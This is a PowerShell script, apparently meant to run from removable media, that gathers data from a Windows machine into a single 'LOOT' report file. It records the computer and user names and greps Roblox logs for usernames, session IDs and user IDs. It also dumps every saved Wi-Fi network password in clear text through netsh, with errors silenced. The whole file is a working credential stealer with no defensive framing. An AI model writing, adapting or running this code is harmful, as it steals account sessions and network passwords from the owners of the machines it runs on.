# ============================================
# SB-PI-Auto.ps1
# Role: Collector & Consolidator
# Output: Single consolidated file in LOOT folder
# ============================================

$ErrorActionPreference = "SilentlyContinue"

# --- 1. SETUP LOOT DIRECTORY ---
$scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
$lootDir = Join-Path $scriptPath "LOOT"
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null

# Timestamp for unique filename
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
# THE SINGLE FILE THAT CONTAINS ALL INFO
$finalReport = Join-Path $lootDir "ALL_INFO_$timestamp.txt"

# --- 2. START WRITING TO THE SINGLE FILE ---
"SPECIALIZED DATA EXTRACTION REPORT" | Out-File $finalReport
"==================================" | Out-File $finalReport -Append
"Date: $(Get-Date)" | Out-File $finalReport -Append
"Computer Name: $env:COMPUTERNAME" | Out-File $finalReport -Append
"User: $env:USERNAME" | Out-File $finalReport -Append
"==================================" | Out-File $finalReport -Append

# ==========================================
# SECTION 1: ROBLOX ACCOUNT INFO
# ==========================================
Write-Host "[*] Checking for Roblox Accounts..." -ForegroundColor Yellow

$robloxInstalled = Test-Path "C:\Program Files\Roblox" -ErrorAction SilentlyContinue

if ($robloxInstalled) {
    "=== ROBLOX ACCOUNT DATA ===" | Out-File $finalReport -Append
    
    # Roblox stores session data in LocalAppData\Roblox\logs
    $logDir = "$env:LOCALAPPDATA\Roblox\logs"
    
    if (Test-Path $logDir) {
        # Get the most recent log file
        $recentLog = Get-ChildItem $logDir -Filter "*.log" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
        
        if ($recentLog) {
            # Search for username or session ID patterns in the logs
            $content = Get-Content $recentLog.FullName -TotalCount 500
            
            # Look for lines containing 'username' or 'session'
            $foundData = $content | Select-String "username|sessionId|userId" -CaseSensitive:$false
            
            if ($foundData) {
                $foundData | Out-File $finalReport -Append
            } else {
                "No login data found in recent logs." | Out-File $finalReport -Append
            }
        } else {
            "No log files found." | Out-File $finalReport -Append
        }
    } else {
        "Roblox Logs directory not found." | Out-File $finalReport -Append
    }
} else {
    "Roblox is not installed." | Out-File $finalReport -Append
}

# ==========================================
# SECTION 2: WIFI PASSWORDS
# ==========================================
Write-Host "[*] Extracting WiFi Passwords..." -ForegroundColor Yellow

"=== WIFI SSIDS & PASSWORDS ===" | Out-File $finalReport -Append

# Get all saved Wi-Fi profiles
$profiles = (netsh wlan show profiles) | Select-String ":(.+)" | ForEach-Object {$_.Matches[0].Groups[1].Value.Trim()}

foreach ($profile in $profiles) {
    # Get the password key for this profile
    $keyCmd = netsh wlan show profile name="$profile" key=clear
    $keyLine = $keyCmd | Select-String "Key Content"
    
    if ($keyLine) {
        "$profile : $($keyLine.Line)" | Out-File $finalReport -Append
    } else {
        "$profile : (No Password / WPA2)" | Out-File $finalReport -Append
    }
}

# ==========================================
# FINALIZE
# ==========================================
"==================================" | Out-File $finalReport -Append
"END OF REPORT" | Out-File $finalReport -Append

Write-Host "[+] Collection Complete." -ForegroundColor Green
Write-Host "[+] Data saved to: $finalReport" -ForegroundColor White

# Optional: Keep the script running briefly so you can see the success message if not hidden fully
Start-Sleep -Seconds 2